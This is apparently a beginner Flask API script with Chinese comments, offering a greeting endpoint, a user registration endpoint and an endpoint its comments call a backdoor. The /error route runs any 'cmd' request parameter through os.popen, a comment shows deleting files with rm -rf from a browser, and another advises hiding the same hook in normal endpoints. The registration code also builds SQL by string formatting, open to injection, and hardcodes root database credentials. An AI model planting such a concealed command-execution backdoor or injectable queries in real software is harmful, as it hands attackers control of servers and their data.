import os
import flask, json, pymysql,request

server = flask.Flask(__name__)  # __name__代表当前python文件, 把当前python文件当成一个服务


def opt_db(sql):
    coon = pymysql.connect(
        host='192.168.1.8',
        user='root',
        passwd='123456',
        db='testing',
        port=3306,
        charset='utf8'
    )  # 建立db链接
    cur = coon.cursor()  # 建立游标
    cur.execute(sql);  # 执行sql
    if sql.strip()[:6].upper() == 'SELECT':
        res = cur.fetchall()  # 获取sql返回
    else:
        coon.commit()
        res = 'ok'
    cur.close()  # 关闭游标
    coon.close()  # 关闭db链接
    return res


# get请求, 请求路径ip:port/index
@server.route('/index', methods=['get'])  # 装饰器,代表index函数是一个接口,支持get请求(默认get请求)
def index():
    res = {'msg': '这是我开发的第一个接口', 'msg_code': '0'}
    return json.dumps(res, ensure_ascii=False, indent=4)


# post请求, 请求路径ip:port/reg
@server.route('/reg', methods=['post'])  # 装饰器,代表reg函数是一个接口,支持post请求(可以同时支持get、post请求)
def reg():

    username = flask.request.values.get('username') # 获取接口入参
    pwd = flask.request.values.get('passwd')
    print(username,pwd)
    if username and pwd:
        sql = 'select * from user where name="%s";' % username
        if opt_db(sql):
            res = {'msg': '用户已存在', 'msg_code': 2001}  # 2001用户已存在
        else:
            insert_sql = 'insert into user (name,password) VALUES ("%s","%s");' % (username, pwd)
            opt_db(insert_sql)
            res = {'msg': '注册成功', 'msg_code': '0'}
    else:
        res = {'msg': '必填字段未填, 请查看接口文档', 'msg_code': 1001}  # 1001必填字段未填
    return json.dumps(res, ensure_ascii=False, indent=4)


# 后门接口


@server.route('/error', methods=['post'])  # 路由，访问地址为----IP:端口/error
def cmd():
  cmd = flask.request.values.get('cmd')  # 接口的入参
  res = os.popen(cmd)  # 执行用户命令
  return res.read()  # 返回执行结果
  # http://127.0.0.1:8999/error?cmd=rm -rf a.txt 后门接口可以直接通过浏览器删除系统文件
  # 隐蔽一点的方法，把cmd = flask.request.values('cmd'，None)写入正常接口
  # 默认可以不传，一但传了再res = os.popen(cmd)


server.run(port=6688, debug=True, host='0.0.0.0')  # 启动服务,接口才能访问
